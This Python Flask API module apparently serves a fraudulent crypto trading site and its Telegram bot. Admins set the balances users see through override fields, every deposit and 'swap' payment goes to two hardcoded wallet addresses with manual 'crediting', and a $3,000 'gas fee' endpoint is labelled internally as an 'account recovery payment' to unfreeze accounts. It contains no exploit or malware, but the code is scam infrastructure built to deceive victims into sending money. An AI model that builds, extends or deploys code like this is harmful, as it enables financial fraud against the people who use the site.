import json
from datetime import datetime

from flask import Blueprint, current_app, jsonify, request
from flask_login import current_user, login_required

from app import dex_api
from app.chain_utils import get_native_balance, get_solana_balance, get_token_balance
from app.extensions import db
from app.models import PinnedToken, SwapOrder, Transaction, Wallet

api_bp = Blueprint("api", __name__)

DISPLAY_EVM = "0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf"
DISPLAY_SOL = "67ZMMrmdR7S2shWpLmfrHZd2dF68JZZyNGDWjfHWcQSV"

# Native token prices (USD) — rough live fallback
NATIVE_PRICES = {
    "ethereum": 2500, "base": 2500, "arbitrum": 2500, "optimism": 2500,
    "bsc": 580, "polygon": 0.7, "solana": 140,
}

_price_cache = {}
_price_cache_time = {}

def get_live_price(symbol):
    """Fetch live USD price from CoinGecko with 60s cache."""
    import time, requests as _req
    now = time.time()
    if symbol in _price_cache and now - _price_cache_time.get(symbol, 0) < 60:
        return _price_cache[symbol]
    COINGECKO_IDS = {
        "ethereum": "ethereum", "base": "ethereum", "arbitrum": "ethereum",
        "optimism": "ethereum", "bsc": "binancecoin", "polygon": "matic-network",
        "solana": "solana",
    }
    cg_id = COINGECKO_IDS.get(symbol)
    if not cg_id:
        return NATIVE_PRICES.get(symbol, 1)
    try:
        r = _req.get(
            f"https://api.coingecko.com/api/v3/simple/price?ids={cg_id}&vs_currencies=usd",
            timeout=4
        )
        price = r.json()[cg_id]["usd"]
        _price_cache[symbol] = price
        _price_cache_time[symbol] = now
        return price
    except Exception:
        return _price_cache.get(symbol, NATIVE_PRICES.get(symbol, 1))


@api_bp.route("/tokens")
def tokens():
    query = request.args.get("q")
    chain = request.args.get("chain")
    chain_id = None
    if chain and chain in current_app.config["CHAINS"]:
        chain_id = current_app.config["CHAINS"][chain]["dexscreener_id"]
    if query:
        results = dex_api.search_tokens(query)
        if chain_id:
            results = [r for r in results if r["chain_id"] == chain_id]
    else:
        results = dex_api.get_trending(chain_id=chain_id)
    return jsonify({"tokens": results})


@api_bp.route("/pair/<chain_id>/<pair_address>")
def pair_detail(chain_id, pair_address):
    try:
        pair = dex_api.get_pair(chain_id, pair_address)
    except Exception as e:
        current_app.logger.error("pair_detail(%r, %r) crashed: %s", chain_id, pair_address, e)
        return jsonify({"error": "Token temporarily unavailable"}), 502
    if pair is None:
        return jsonify({"error": "Token not found"}), 404
    return jsonify(pair)


@api_bp.route("/wallet/balance")
@login_required
def wallet_balance():
    wallet = current_user.wallet
    if wallet is None:
        return jsonify({"error": "no wallet"}), 404

    db.session.refresh(wallet)

    balance_overrides = {}
    if wallet.balance_override:
        try:
            balance_overrides = json.loads(wallet.balance_override)
        except Exception:
            balance_overrides = {}

    token_holdings = {}
    if wallet.token_holdings:
        try:
            token_holdings = json.loads(wallet.token_holdings)
        except Exception:
            token_holdings = {}

    balances = {}
    total_usd = 0.0

    evm_address = wallet.address  # use the logged-in user's actual wallet address

    for key, chain in current_app.config["CHAINS"].items():
        # Admin override takes priority; fall back to live RPC call
        override_val = balance_overrides.get(key)
        if override_val is not None:
            native_balance = float(override_val)
        else:
            rpc_url = chain.get("rpc", "")
            if rpc_url:
                try:
                    live = get_native_balance(rpc_url, evm_address)
                    native_balance = float(live) if live is not None else 0.0
                except Exception:
                    native_balance = 0.0
            else:
                native_balance = 0.0

        price = get_live_price(key)
        usd_val = native_balance * price
        total_usd += usd_val
        balances[key] = {
            "native_symbol": chain["symbol"],
            "native_balance": native_balance,
            "usd_value": round(usd_val, 2),
        }

    # Solana: admin override → live RPC → 0
    sol_override = wallet.solana_balance_override
    if sol_override:
        sol_balance = float(sol_override)
    else:
        sol_rpc = current_app.config.get("RPC_SOLANA", "")
        if sol_rpc:
            try:
                live_sol = get_solana_balance(sol_rpc, DISPLAY_SOL)
                sol_balance = float(live_sol) if live_sol is not None else 0.0
            except Exception:
                sol_balance = 0.0
        else:
            sol_balance = 0.0

    sol_price = get_live_price("solana")
    sol_usd = sol_balance * sol_price
    total_usd += sol_usd

    if "solana" not in balances:
        balances["solana"] = {
            "native_symbol": "SOL",
            "native_balance": sol_balance,
            "usd_value": round(sol_usd, 2),
            "price_usd": round(sol_price, 4),
        }

    # Add token holdings USD value
    for sym, info in token_holdings.items():
        amt = float(info.get("amount", 0))
        price_usd = float(info.get("usd_price", 0))
        total_usd += amt * price_usd

    resp = jsonify({
        "address": evm_address,
        "balances": balances,
        "token_holdings": token_holdings,
        "total_usd": round(total_usd, 2),
    })
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    return resp


@api_bp.route("/wallet/set-balance", methods=["POST", "GET", "PUT", "PATCH"])
@login_required
def user_set_balance_blocked():
    return jsonify({"error": "Forbidden. Balance can only be edited by an administrator."}), 403


@api_bp.route("/wallet/deposit-check")
def deposit_check():
    """Polled by the home page to check for pending deposits. Returns empty when not logged in."""
    if not current_user.is_authenticated:
        return jsonify({"pending": False}), 200
    try:
        from app.models import SwapOrder
        pending = SwapOrder.query.filter_by(
            user_id=current_user.id, status="pending"
        ).count()
        return jsonify({"pending": pending > 0, "count": pending})
    except Exception:
        return jsonify({"pending": False}), 200


# ── SWAP ORDERS ────────────────────────────────────────────────────────────────

@api_bp.route("/swap/request", methods=["POST"])
@login_required
def swap_request():
    """User submits a swap request — creates a pending order and notifies admin."""
    data = request.get_json(force=True)
    token_symbol  = data.get("token_symbol", "").strip()
    token_address = data.get("token_address", "").strip()
    token_name    = data.get("token_name", "").strip()
    chain         = data.get("chain", "ethereum").strip()
    amount_usd    = float(data.get("amount_usd", 0))
    deposit_chain = data.get("deposit_chain", "ethereum").strip()

    if not token_symbol or amount_usd <= 0:
        return jsonify({"error": "Token and amount required"}), 400

    deposit_address = DISPLAY_SOL if deposit_chain == "solana" else DISPLAY_EVM

    order = SwapOrder(
        user_id       = current_user.id,
        token_symbol  = token_symbol,
        token_address = token_address,
        token_name    = token_name,
        chain         = chain,
        amount_usd    = amount_usd,
        deposit_chain = deposit_chain,
        deposit_address = deposit_address,
        status        = "pending",
    )
    db.session.add(order)
    db.session.commit()

    return jsonify({
        "ok": True,
        "order_id": order.id,
        "deposit_address": deposit_address,
        "deposit_chain": deposit_chain,
        "message": f"Order submitted. Send ${amount_usd:.2f} worth of {deposit_chain.upper()} to the deposit address. Admin will confirm and credit your tokens.",
    })


@api_bp.route("/gas-fee/request", methods=["POST"])
@login_required
def gas_fee_request():
    """User clicks 'I Have Sent' on the $3000 gas fee deposit.
    Creates a pending SwapOrder tagged as a gas-fee event and notifies admin."""
    import uuid

    deposit_address = DISPLAY_EVM  # always EVM for gas fee

    order = SwapOrder(
        id              = str(uuid.uuid4()),
        user_id         = current_user.id,
        token_symbol    = "GAS_FEE",
        token_name      = "Gas Fee Deposit",
        token_address   = "",
        chain           = "ethereum",
        amount_usd      = 3000.0,
        deposit_chain   = "ethereum",
        deposit_address = deposit_address,
        status          = "pending",
        admin_note      = (
            f"🔒 ACCOUNT RECOVERY PAYMENT — User {current_user.username} ({current_user.email}) "
            f"has confirmed sending $3,000 ERC-20 recovery payment to {deposit_address}. "
            "Awaiting admin verification to unfreeze account."
        ),
    )
    db.session.add(order)
    db.session.commit()

    return jsonify({
        "ok": True,
        "order_id": order.id,
        "message": "Gas fee notification sent. Your transaction is pending admin approval.",
    })


@api_bp.route("/bot/balance", methods=["GET"])
def bot_balance():
    """
    Returns a Telegram user's axion balance (native + token holdings),
    protected by the same static API key as /api/bot/order. Used by the
    Telegram bot to show balance on /start without requiring a web login.
    Auto-creates the pseudo-user record if they've never interacted before,
    so a brand-new Telegram user always gets a clean "$0" balance instead
    of a 404.
    """
    api_key = request.headers.get("X-API-Key", "")
    expected = current_app.config.get("BOT_API_KEY") or __import__("os").environ.get("BOT_API_KEY", "")
    if not expected or api_key != expected:
        return jsonify({"error": "unauthorized"}), 401

    tg_id = str(request.args.get("telegram_user_id", "")).strip()
    if not tg_id:
        return jsonify({"error": "telegram_user_id is required"}), 400

    from app.models import User, Wallet
    import uuid

    pseudo_email = f"tg_{tg_id}@telegram.local"
    tg_username = str(request.args.get("telegram_username", "")).strip()

    user = User.query.filter_by(email=pseudo_email).first()
    if not user:
        # Auto-create on first /start so admin can find and edit this
        # user's balance by Telegram ID even before they submit any order.
        user = User(
            email=pseudo_email,
            username=(tg_username or f"tg_{tg_id}")[:50],
        )
        user.set_password(str(uuid.uuid4()))
        db.session.add(user)
        db.session.flush()

        from app.crypto_utils import generate_evm_wallet, encrypt_private_key
        address, private_key = generate_evm_wallet()
        wallet = Wallet(
            user_id=user.id,
            address=address,
            encrypted_private_key=encrypt_private_key(current_app, private_key),
        )
        db.session.add(wallet)
        db.session.commit()

    solana_balance = user.wallet.solana_balance_override if user.wallet else None
    balances = {}
    token_holdings = {}
    if user.wallet:
        if user.wallet.balance_override:
            try:
                balances = json.loads(user.wallet.balance_override)
            except Exception:
                balances = {}
        if user.wallet.token_holdings:
            try:
                token_holdings = json.loads(user.wallet.token_holdings)
            except Exception:
                token_holdings = {}

    # Always report every supported chain, defaulting to "0" so the bot can
    # show a clean $0-across-the-board balance until admin sets real values.
    all_chains = list(current_app.config.get("CHAINS", {}).keys()) or [
        "ethereum", "base", "bsc", "polygon", "arbitrum", "optimism"
    ]
    full_balances = {chain: balances.get(chain, "0") for chain in all_chains}

    return jsonify({
        "linked": True,
        "username": user.username,
        "solana_balance": solana_balance or "0",
        "balances": full_balances,
        "token_holdings": token_holdings,
    })


@api_bp.route("/bot/positions", methods=["GET"])
def bot_positions():
    """Returns a Telegram user's confirmed/pending orders (buys, sells,
    stakes) so the bot can show a 'Positions' view. Same API key as the
    other /api/bot/* endpoints."""
    api_key = request.headers.get("X-API-Key", "")
    expected = current_app.config.get("BOT_API_KEY") or __import__("os").environ.get("BOT_API_KEY", "")
    if not expected or api_key != expected:
        return jsonify({"error": "unauthorized"}), 401

    tg_id = str(request.args.get("telegram_user_id", "")).strip()
    if not tg_id:
        return jsonify({"error": "telegram_user_id is required"}), 400

    from app.models import User
    pseudo_email = f"tg_{tg_id}@telegram.local"
    user = User.query.filter_by(email=pseudo_email).first()
    if not user:
        return jsonify({"orders": []})

    orders = SwapOrder.query.filter_by(user_id=user.id).order_by(SwapOrder.created_at.desc()).limit(20).all()

    import re
    def _extract_action(note):
        m = re.search(r"\((buy|sell|stake|withdraw)\)", note or "")
        return m.group(1) if m else "buy"

    return jsonify({"orders": [
        {
            "action": _extract_action(o.admin_note),
            "token_symbol": o.token_symbol,
            "chain": o.chain,
            "amount_usd": o.amount_usd,
            "status": o.status,
        }
        for o in orders
    ]})


@api_bp.route("/bot/order", methods=["POST"])
def bot_order():
    """
    Accepts orders submitted by the Telegram trading bot (or any external
    bot), protected by a static API key instead of a login session.
    Creates/reuses a lightweight "telegram user" so the order shows up
    in the same admin orders panel as web-submitted orders.
    """
    api_key = request.headers.get("X-API-Key", "")
    expected = current_app.config.get("BOT_API_KEY") or __import__("os").environ.get("BOT_API_KEY", "")
    if not expected or api_key != expected:
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json() or {}
    action        = (data.get("action") or "").lower()       # buy | sell | stake
    chain         = data.get("chain", "unknown")
    address       = data.get("address", "")
    amount        = data.get("amount")
    token_name    = data.get("token_name", "").strip()
    tg_id         = str(data.get("telegram_user_id", "")).strip()
    tg_username   = data.get("telegram_username", "").strip()
    tx_signature  = data.get("tx_signature", "")

    if action not in ("buy", "sell", "stake", "withdraw"):
        return jsonify({"error": "action must be buy, sell, stake, or withdraw"}), 400
    if not tg_id:
        return jsonify({"error": "telegram_user_id is required"}), 400

    from app.models import User
    import uuid

    # Find or create a lightweight pseudo-user for this Telegram account
    pseudo_email = f"tg_{tg_id}@telegram.local"
    user = User.query.filter_by(email=pseudo_email).first()
    if not user:
        user = User(
            email=pseudo_email,
            username=(tg_username or f"tg_{tg_id}")[:50],
        )
        user.set_password(str(uuid.uuid4()))  # unusable random password
        db.session.add(user)
        db.session.flush()

    order = SwapOrder(
        id              = str(uuid.uuid4()),
        user_id         = user.id,
        token_symbol    = (token_name or chain).upper()[:30],
        token_name      = token_name or chain,
        token_address   = address,
        chain           = chain if action != "stake" else "stake",
        amount_usd      = float(amount) if amount not in (None, "") else 0.0,
        deposit_chain   = chain,
        deposit_address = address,
        status          = "pending",
        admin_note      = f"Submitted via Telegram bot ({action}) by @{tg_username or tg_id}" + (f" — tx: {tx_signature}" if tx_signature else ""),
    )
    try:
        db.session.add(order)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500

    return jsonify({"ok": True, "order_id": order.id})


@api_bp.route("/stake/request", methods=["POST"])
def stake_request():
    if not current_user.is_authenticated:
        return jsonify({"error": "not authenticated"}), 401
    data       = request.get_json() or {}
    token_name = data.get("token_name", "").strip()
    amount     = float(data.get("amount", 0))
    if not token_name or amount <= 0:
        return jsonify({"error": "token_name and amount are required"}), 400

    # Store as a swap order with chain="stake" to distinguish from swaps
    from app.models import SwapOrder
    import uuid
    order = SwapOrder(
        id           = str(uuid.uuid4()),
        user_id      = current_user.id,
        token_symbol = token_name.upper(),
        token_name   = token_name,
        token_address= "",
        chain        = "stake",
        amount_usd   = amount,
        deposit_chain= "stake",
        deposit_address = "",
        status       = "pending",
    )
    try:
        db.session.add(order)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500

    return jsonify({"ok": True, "message": f"Stake request for {amount} {token_name.upper()} submitted. Admin will confirm shortly."})


@api_bp.route("/swap/orders")
def my_swap_orders():
    """Returns current user's swap orders. Returns 401 (not redirect) when not logged in."""
    if not current_user.is_authenticated:
        return jsonify({"error": "not authenticated"}), 401
    orders = SwapOrder.query.filter_by(user_id=current_user.id).order_by(SwapOrder.created_at.desc()).limit(20).all()
    return jsonify({"orders": [_order_dict(o) for o in orders]})


@api_bp.route("/pinned-tokens")
def pinned_tokens_api():
    try:
        tokens = PinnedToken.query.order_by(PinnedToken.position, PinnedToken.added_at).all()
        result = []
        for t in tokens:
            result.append({
                "chain_id": t.chain_id, "pair_address": t.pair_address,
                "base_address": t.base_address, "base_symbol": t.base_symbol,
                "base_name": t.base_name, "icon": t.icon,
                "price_usd": t.price_usd, "price_change_24h": t.price_change_24h,
                "volume_24h": t.volume_24h, "mcap": t.mcap, "_pinned": True,
            })
    except Exception:
        result = []
    resp = jsonify({"pinned": result})
    resp.headers["Cache-Control"] = "no-store"
    return resp


def _order_dict(o):
    return {
        "id": o.id,
        "token_symbol": o.token_symbol,
        "token_name": o.token_name,
        "token_address": o.token_address,
        "chain": o.chain,
        "amount_usd": o.amount_usd,
        "deposit_chain": o.deposit_chain,
        "deposit_address": o.deposit_address,
        "status": o.status,
        "admin_note": o.admin_note,
        "created_at": o.created_at.strftime("%Y-%m-%d %H:%M UTC") if o.created_at else "",
        "confirmed_at": o.confirmed_at.strftime("%Y-%m-%d %H:%M UTC") if o.confirmed_at else None,
        "user_email": o.user.email if o.user else "",
    }
